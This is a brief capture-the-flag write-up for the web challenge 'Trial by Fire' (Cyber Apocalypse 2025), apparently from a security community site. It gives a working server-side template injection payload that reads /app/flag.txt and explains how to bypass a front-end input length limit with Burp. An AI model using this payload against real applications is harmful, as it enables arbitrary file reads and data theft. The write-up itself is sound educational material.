---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | Trial by Fire Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: web
challenge: Trial by Fire
tags: ""
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2025</h1>

## Trial by Fire
> Solved by thewhiteh4t


- We have an input and a hint for SSTI `Can you read the runes? Perhaps 49 is the key.`
- On the battle result page we can see that SSTI is working


![](https://i.imgur.com/XcNrIpA.png)

- Payload :

```
    {{ request.__class__._load_form_data.__globals__.__builtins__.open("/app/flag.txt").read() }}
```

- Length of the input is restricted in the front-end, so we can either edit the length in inspect or simply use burp


![](https://i.imgur.com/aBge1Lj.png)

